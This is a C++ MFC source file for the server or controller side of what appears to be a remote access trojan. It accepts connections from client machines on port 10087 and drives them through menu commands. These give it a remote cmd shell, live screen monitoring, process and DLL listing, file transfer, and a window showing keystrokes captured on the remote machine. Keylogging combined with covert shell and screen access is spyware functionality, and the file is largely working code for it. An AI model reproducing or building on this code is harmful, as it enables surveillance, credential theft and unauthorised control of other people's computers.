﻿
// Remote-SERVERDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "Remote-SERVER.h"
#include "Remote-SERVERDlg.h"
#include "afxdialogex.h"
#include"Mysession.h"
#include"DATA.h"
#include<vector>
#include<TlHelp32.h>
#include<fstream>
using namespace std;
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
//线程参数
struct param
{
public:
	SOCKET* sclient;
	Mysession *psession;
	std::vector<std::string>* process = NULL;
	CRemoteSERVERDlg* dlg;
};

DWORD WINAPI recvthread(LPVOID lparam)
{
	param* p = (param*)lparam;
	bool bret;
	while (true)
	{

		/*int getdate = 0;
		char rbuf[30] = { 0 };
		getdate = recv(*sclient, rbuf, sizeof(unsigned int) * 2, 0);
		DATA* datapacket = (DATA*)rbuf;*/
		char* pdata = NULL;
		//收取头部数据
		DATA drbuf;
		bret = recvdata(*(p->sclient), (char*)&drbuf, sizeof(unsigned int) * 2);
		if (!bret) return 0;

		p->psession->clientlasttime = GetTickCount();
		senddatahead(*(p->sclient), SERVER_BEAT);

		if (drbuf.length >= 0)
		{
			pdata = new char[drbuf.length+5];
			memset(pdata, 0, drbuf.length + 5);
			if (pdata == NULL) return 0;

			recvdata(*(p->sclient), pdata, drbuf.length);

			//更新收包时间戳
			p->psession->clientlasttime = GetTickCount();


			if (drbuf.type == CLIENT_KEYBOARD_BACK)
			{
				//输出keyboard数据
				if (p->psession->pkeyboarddlg != NULL)
				{
					p->psession->pkeyboarddlg->edit_keyboard_record.SetSel(-1);
					p->psession->pkeyboarddlg->edit_keyboard_record.ReplaceSel((CString)pdata+ "\r\n");

				}
			}
			else if (drbuf.type == CLIENT_CMD_BACK)
			{
				//输出cmd数据
				if (p->psession->pcmddlg != NULL /*&& drbuf.length != 0*/)
				{
					p->psession->pcmddlg->sclient = (p->sclient);

					p->psession->pcmddlg->edit_output.SetSel(-1);
					p->psession->pcmddlg->edit_output.ReplaceSel((CString)pdata);
				}

			}
			else if (drbuf.type == CLIENT_SCREEN_BACK)
			{
				if (p->psession->pscreendlg != NULL)
				{
					//显示屏幕监控数据
					p->psession->pscreendlg->ShowWindow(SW_SHOW);
					p->psession->pscreendlg->showscreen(pdata, drbuf.length);
					if (p->psession->pscreendlg->isclose) {
						senddatahead(*(p->sclient), SERVER_SCREEN_COMMAND);
					}
				}
			}
			else if (drbuf.type == CLIENT_PROCESS_BACK)
			{
				if (p->psession->pprocessdlg != NULL)
				{
					PROCESSENTRY32 pe32 = { 0 };
					memcpy(&pe32, pdata, sizeof(PROCESSENTRY32));

					p->psession->pprocessdlg->sclient = *(p->sclient);
					p->process->push_back(pe32.szExeFile);
					p->psession->pprocessdlg->LIST_PROCESS.InsertItem(p->process->size() - 1, pe32.szExeFile);
					p->psession->pprocessdlg->LIST_PROCESS.SetItemData(p->process->size() - 1, pe32.th32ProcessID);

					CString text1;
					text1.Format("%d", pe32.th32ProcessID);
					p->psession->pprocessdlg->LIST_PROCESS.SetItemText(p->process->size() - 1, 1, text1);

					CString text2;
					text2.Format("%d", pe32.th32ParentProcessID);
					p->psession->pprocessdlg->LIST_PROCESS.SetItemText(p->process->size() - 1, 2, text2);
				}
			}
			else if (drbuf.type == CLIENT_DLLDATA_BACK)
			{
				if (p->psession->pprocessdlg->pdlldlg != NULL)
				{
					MODULEENTRY32 module32 = { 0 };
					module32.dwSize = sizeof(MODULEENTRY32);
					memcpy(&module32, pdata, sizeof(MODULEENTRY32));

					{
						std::lock_guard<std::mutex> lg(p->dlg->accept_mutex);  //对map进行锁存
						p->psession->pprocessdlg->pdlldlg->dllpath.push_back(module32.szExePath);
						Sleep(5);
					}

					p->psession->pprocessdlg->pdlldlg->list_dll.InsertItem(p->psession->pprocessdlg->pdlldlg->dllpath.size()-1, module32.szExePath);
				}
			}
			else if (drbuf.type == CLIENT_FILE_DOWN)
			{
				p->psession->pfiletransfer->s = *(p->sclient);
			}
			else if (drbuf.type == SERVER_FILE_UP)
			{
				if (drbuf.length == 0)
				{
					senddatahead(*(p->sclient), CLIENT_FILE_DOWN);
				}
				if (drbuf.length > 0)
				{
					filedatastruct* fdatastruct = (filedatastruct*)pdata;
					ofstream file;


					file.open(fdatastruct->despath, ios::out | ios::app|ios::binary, _SH_DENYRW);

					file.write(fdatastruct->filedata, fdatastruct->datasize);
					file.close();
				}
			}

			if (pdata != NULL)
			{
				delete[] pdata;
				pdata = NULL;
			}
		}
	}
	return true;
}

DWORD WINAPI CRemoteSERVERDlg::acceptthread(LPVOID lparam)
{
	CRemoteSERVERDlg* dlg = (CRemoteSERVERDlg*)lparam;

	std::thread heartbeat([&] {


		while (true)
		{
			
				std::vector<SOCKET> del;


				for (auto m : dlg->map_session)
				{
					SOCKET s = m.first;
					Mysession* psession = m.second;
					if (GetTickCount() - psession->clientlasttime > HEART_BEAT_TIME * 2)
					{
						//此时该客户端掉线 处理map 处理界面 处理socket

						//处理socket
						/*closesocket(s);*/
						del.push_back(s);
					}
				}

				if (del.size() > 0)
				{
					std::lock_guard<std::mutex> lg(dlg->accept_mutex);  //对map进行锁存
					//处理map
					for (auto l : del)
					{
						dlg->map_session.erase(l);
					}
				}

				//处理界面
				for (int i = 0; i < dlg->list_client.GetItemCount(); i++)
				{
					SOCKET sclient = dlg->list_client.GetItemData(i);
					for (auto l : del)
					{
						if (l == sclient)
						{
							dlg->list_client.DeleteItem(i);
							break;
						}
					}
				}

				del.clear();

				Sleep(HEART_BEAT_TIME);
			
		}
		
	});

	param p; //recv线程参数
	while (true)
	{
		sockaddr_in clientaddr = { 0 };
		clientaddr.sin_family = AF_INET;
		int addrlen = sizeof(sockaddr_in);

		SOCKET sclient = accept(dlg->sserver, (sockaddr*)&clientaddr, &addrlen);
		
		Mysession* psession = new Mysession;
		psession->sclient = sclient;
		memcpy(&(psession->clientaddr), &clientaddr, sizeof(sockaddr_in));
		psession->clientlasttime = GetTickCount();



		{
			std::lock_guard<std::mutex> lg(dlg->accept_mutex);  //对map进行锁存
			dlg->map_session.insert(std::make_pair(sclient, psession));  //记录每个客户端
		}

		char ipandport[256] = {0};
		sprintf_s(ipandport, "%s:%d", inet_ntoa(clientaddr.sin_addr), ntohs(clientaddr.sin_port));
		int index = dlg->list_client.InsertItem(dlg->map_session.size(), ipandport);
		if (index != -1)
		{
			//序号与socket关联
			dlg->list_client.SetItemData(index, sclient);
		}
		//构建线程参数
		
		p.psession = psession;
		p.sclient = &sclient;
		p.dlg = dlg;
		p.process = new std::vector<std::string>;
		//客户端的recv线程
		CreateThread(0, 0, recvthread, &p, 0, 0);
		
	}
	if (p.process != NULL) delete p.process;
}

void CRemoteSERVERDlg::initialization()
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);

	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		/* Tell the user that we could not find a usable */
		/* WinSock DLL.                                  */
		return;
	}


	this->sserver = socket(AF_INET, SOCK_STREAM, 0);


	//2.bind/listen
	//sockaddr addr;
	sockaddr_in addr;
	int length = sizeof(sockaddr_in);
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");
	addr.sin_port = htons(10087);
	bind(this->sserver, (sockaddr*)&addr, length);


	listen(this->sserver, 5);

	this->hclient = CreateThread(0, 0, acceptthread, this, 0, 0);
}


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
//	virtual void OnCancel();
	virtual void OnCancel();
};


void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CRemoteSERVERDlg 对话框



CRemoteSERVERDlg::CRemoteSERVERDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_REMOTESERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CRemoteSERVERDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST2, list_client);
}

BEGIN_MESSAGE_MAP(CRemoteSERVERDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_NOTIFY(NM_RCLICK, IDC_LIST2, &CRemoteSERVERDlg::OnNMRClickList2)
	ON_COMMAND(ID_SCREEN, &CRemoteSERVERDlg::OnScreen)
	ON_COMMAND(ID_CMD, &CRemoteSERVERDlg::OnCmd)
	ON_COMMAND(ID_KEYBOARD, &CRemoteSERVERDlg::OnKeyboard)
	ON_COMMAND(ID_PROCESS, &CRemoteSERVERDlg::OnProcess)
	ON_COMMAND(ID_32783, &CRemoteSERVERDlg::Onfiletransfer)
END_MESSAGE_MAP()


// CRemoteSERVERDlg 消息处理程序

BOOL CRemoteSERVERDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	list_client.InsertColumn(0, "ip:port");
	list_client.InsertColumn(1, "system");
	list_client.InsertColumn(2, "information");  //设置展示客户端信息

	list_client.SetColumnWidth(0, 200);
	list_client.SetColumnWidth(1, 200);
	list_client.SetColumnWidth(2, 200);			//设置列间距

	list_client.SetExtendedStyle(list_client.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);//设置风格

	//服务端套接字初始化并监听
	initialization();

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CRemoteSERVERDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CRemoteSERVERDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CRemoteSERVERDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


//菜单加载
void CRemoteSERVERDlg::OnNMRClickList2(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu menu;
	menu.LoadMenu(IDR_MENU1);
	CMenu* psubmenu = menu.GetSubMenu(0);


	//获取鼠标当前坐标
	CPoint cp;
	GetCursorPos(&cp);

	psubmenu->TrackPopupMenu(TPM_LEFTALIGN, cp.x, cp.y, this);




	*pResult = 0;
}

//选中屏幕监控
void CRemoteSERVERDlg::OnScreen()
{
	// TODO: 在此添加命令处理程序代码
	//获取当前选中行的socket,向其发送屏幕监控命令
	int pos = list_client.GetSelectionMark();

	SOCKET sclient = list_client.GetItemData(pos);

	senddatahead(sclient, SERVER_SCREEN_COMMAND);

	{
		std::lock_guard<std::mutex> lg(accept_mutex); 
		if (map_session[sclient]->pscreendlg == NULL)
		{
			map_session[sclient]->pscreendlg = new CscreenDlg;
			map_session[sclient]->pscreendlg->Create(IDD_CscreenDlg,this);
		}
		map_session[sclient]->pscreendlg->isclose = true;
	}
}

//选中cmd交互
void CRemoteSERVERDlg::OnCmd()
{
	// TODO: 在此添加命令处理程序代码
	//获取当前选中行的socket,向其交互cmd数据
	int pos = list_client.GetSelectionMark();

	SOCKET sclient = list_client.GetItemData(pos);

	{
		std::lock_guard<std::mutex> lg(accept_mutex);
		if (map_session[sclient]->pcmddlg == NULL)
		{
			map_session[sclient]->pcmddlg = new Ccmddlg;
			map_session[sclient]->pcmddlg->Create(IDD_Ccmddlg, this);
		}
	}
	map_session[sclient]->pcmddlg->ShowWindow(SW_SHOW);

	senddatahead(sclient,SEVER_CMD_COMMAND);
}

//选中键盘记录
void CRemoteSERVERDlg::OnKeyboard()
{
	// TODO: 在此添加命令处理程序代码
	//获取当前选中行的socket,接受键盘记录数据
	int pos = list_client.GetSelectionMark();

	SOCKET sclient = list_client.GetItemData(pos);

	{
		std::lock_guard<std::mutex> lg(accept_mutex);
		if (map_session[sclient]->pkeyboarddlg == NULL)
		{
			map_session[sclient]->pkeyboarddlg = new Ckeyboarddlg;
			map_session[sclient]->pkeyboarddlg->Create(IDD_Ckeyboarddlg, this);
		}
	}

	map_session[sclient]->pkeyboarddlg->ShowWindow(SW_SHOW);
}

//查看进程
void CRemoteSERVERDlg::OnProcess()
{
	// TODO: 在此添加命令处理程序代码
	int pos = list_client.GetSelectionMark();

	SOCKET sclient = list_client.GetItemData(pos);

	{
		std::lock_guard<std::mutex> lg(accept_mutex);
		if (map_session[sclient]->pprocessdlg == NULL)
		{
			map_session[sclient]->pprocessdlg = new Cprocessdlg;
			map_session[sclient]->pprocessdlg->Create(IDD_Cprocessdlg, this);

			map_session[sclient]->pprocessdlg->LIST_PROCESS.InsertColumn(0, "进程");
			map_session[sclient]->pprocessdlg->LIST_PROCESS.InsertColumn(1, "PID");
			map_session[sclient]->pprocessdlg->LIST_PROCESS.InsertColumn(2, "父进程PID");  //设置展示客户端信息

			map_session[sclient]->pprocessdlg->LIST_PROCESS.SetColumnWidth(0, 230);
			map_session[sclient]->pprocessdlg->LIST_PROCESS.SetColumnWidth(1, 230);
			map_session[sclient]->pprocessdlg->LIST_PROCESS.SetColumnWidth(2, 230);			//设置列间距

			map_session[sclient]->pprocessdlg->LIST_PROCESS.SetExtendedStyle(map_session[sclient]->pprocessdlg->LIST_PROCESS.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);//设置风格

		}
	}
	map_session[sclient]->pprocessdlg->ShowWindow(SW_SHOW);

	senddatahead(sclient, SERVER_PROCESS_GET);
}


void CRemoteSERVERDlg::Onfiletransfer()
{
	// TODO: 在此添加命令处理程序代码
	int pos = list_client.GetSelectionMark();

	SOCKET sclient = list_client.GetItemData(pos);

	senddatahead(sclient, SERVER_FILE_UP);

	{
		std::lock_guard<std::mutex> lg(accept_mutex);
		if (map_session[sclient]->pfiletransfer == NULL)
		{
			map_session[sclient]->pfiletransfer = new Cfiletransferdlg;
			map_session[sclient]->pfiletransfer->Create(IDD_Cfiletransferdlg, this);
		}
	}

	map_session[sclient]->pfiletransfer->ShowWindow(SW_SHOW);
}
